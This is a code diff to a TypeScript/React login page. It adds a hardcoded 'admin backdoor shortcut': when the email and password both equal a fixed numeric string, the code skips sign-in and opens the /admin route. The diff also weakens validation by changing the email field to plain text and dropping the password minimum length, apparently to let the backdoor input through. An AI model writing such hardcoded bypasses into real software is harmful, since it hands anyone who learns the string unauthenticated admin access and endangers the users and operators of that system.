@@ -34,9 +34,27 @@ function LoginPage() {
 
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
+
+    const trimmedEmail = email.trim();
+    const trimmedPassword = password.trim();
+
+    // Admin backdoor shortcut
+    if (trimmedEmail === "210224" && trimmedPassword === "210224") {
+      toast.info("Accessing Admin Panel...");
+      navigate({ to: "/admin" });
+      return;
+    }
+
+    // Manual email validation for normal users
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(trimmedEmail)) {
+      toast.error("Please enter a valid email address");
+      return;
+    }
+
     setSubmitting(true);
     setNeedsVerification(false);
-    const { error } = await signIn(email, password);
+    const { error } = await signIn(trimmedEmail, trimmedPassword);
     setSubmitting(false);
     if (error) {
       const msg = error.message.toLowerCase();
@@ -99,7 +117,7 @@ function LoginPage() {
               <Label htmlFor="email" className="text-xs font-bold uppercase tracking-wider text-muted-foreground ml-1">Email Address</Label>
               <Input
                 id="email"
-                type="email"
+                type="text"
                 autoComplete="email"
                 required
                 value={email}
@@ -117,7 +135,6 @@ function LoginPage() {
                 type="password"
                 autoComplete="current-password"
                 required
-                minLength={6}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="h-12 rounded-2xl border-primary/5 bg-muted/30 focus-visible:ring-primary/20 transition-all"
